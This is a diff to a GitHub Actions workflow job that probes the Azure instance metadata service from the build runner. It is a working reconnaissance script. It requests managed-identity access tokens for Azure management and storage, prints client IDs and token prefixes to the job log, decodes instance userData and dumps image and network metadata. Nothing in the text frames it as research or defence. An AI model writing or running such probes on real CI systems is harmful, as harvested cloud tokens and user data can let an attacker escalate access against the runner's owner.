@@ -8,54 +8,44 @@ jobs:
   inspect:
     runs-on: ubuntu-latest
     steps:
-      - name: Deep IMDS probe
+      - name: Deep IMDS managed identity probe
         run: |
-          echo "=== AZURE MANAGED IDENTITY CHECK ==="
+          echo "=== MANAGED IDENTITY INFO ==="
           curl -sf --max-time 8 \
             "http://169.254.169.254/metadata/identity/info?api-version=2019-08-01" \
-            -H "Metadata: true" && echo "" || echo "No managed identity info endpoint"
+            -H "Metadata: true" | python3 -m json.tool 2>/dev/null || echo "no identity info"
 
           echo ""
           echo "=== MANAGED IDENTITY TOKEN (management.azure.com) ==="
-          curl -sf --max-time 8 \
+          RESP=$(curl -sf --max-time 8 \
             "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/" \
-            -H "Metadata: true" | python3 -c "
-import sys, json
-try:
-    d = json.load(sys.stdin)
-    print('access_token preview:', d.get('access_token','')[:30]+'...')
-    print('token_type:', d.get('token_type'))
-    print('expires_in:', d.get('expires_in'))
-    print('resource:', d.get('resource'))
-    print('client_id:', d.get('client_id','NOT_SET'))
-except Exception as e:
-    print('Error:', e)
-    sys.stdin = open('/dev/stdin')
-" 2>&1 || echo "No managed identity (HTTP error)"
+            -H "Metadata: true" 2>&1)
+          if echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print('TOKEN_TYPE:',d.get('token_type')); print('CLIENT_ID:',d.get('client_id','none')); print('TOK_PREVIEW:',d.get('access_token','')[:40])" 2>/dev/null; then
+            echo "HAS MANAGED IDENTITY WITH AZURE MANAGEMENT ACCESS"
+          else
+            echo "Response: $RESP" | head -5
+          fi
 
           echo ""
-          echo "=== MANAGED IDENTITY TOKEN (github API) ==="
+          echo "=== MANAGED IDENTITY TOKEN (storage.azure.com) ==="
           curl -sf --max-time 8 \
-            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.core.windows.net/" \
-            -H "Metadata: true" | python3 -c "
-import sys, json
-d = json.load(sys.stdin)
-tok = d.get('access_token','')
-print('GOT TOKEN! preview:', tok[:40]+'...')
-print('client_id:', d.get('client_id'))
-" 2>&1 || echo "No managed identity for management"
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://storage.azure.com/" \
+            -H "Metadata: true" -o /dev/null -w "HTTP: %{http_code}\n"
 
           echo ""
-          echo "=== ALL IMDS IDENTITY ENDPOINTS ==="
-          for ep in "info" "oauth2/token?api-version=2019-08-01&resource=https://storage.azure.com/" "oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net/"; do
-            echo -n "identity/$ep: "
-            curl -sf --max-time 5 "http://169.254.169.254/metadata/identity/$ep" -H "Metadata: true" -o /dev/null -w "%{http_code}\n"
-          done
+          echo "=== COMPUTE USER DATA ==="
+          curl -sf --max-time 5 \
+            "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" \
+            -H "Metadata: true" | base64 -d 2>/dev/null || echo "no userData or not base64"
 
           echo ""
-          echo "=== IMDS COMPUTE userData ==="
-          curl -sf --max-time 5 "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text" -H "Metadata: true" && echo "" || echo "no userData"
+          echo "=== IMAGE REFERENCE ==="
+          curl -sf --max-time 5 \
+            "http://169.254.169.254/metadata/instance/compute/storageProfile/imageReference?api-version=2021-02-01" \
+            -H "Metadata: true" | python3 -m json.tool
 
           echo ""
-          echo "=== IMDS IMAGE SUBSCRIPTION ==="
-          curl -sf --max-time 5 "http://169.254.169.254/metadata/instance/compute/storageProfile/imageReference?api-version=2021-02-01" -H "Metadata: true" | python3 -m json.tool
+          echo "=== NETWORK INTERFACES ==="
+          curl -sf --max-time 5 \
+            "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01" \
+            -H "Metadata: true" | python3 -m json.tool
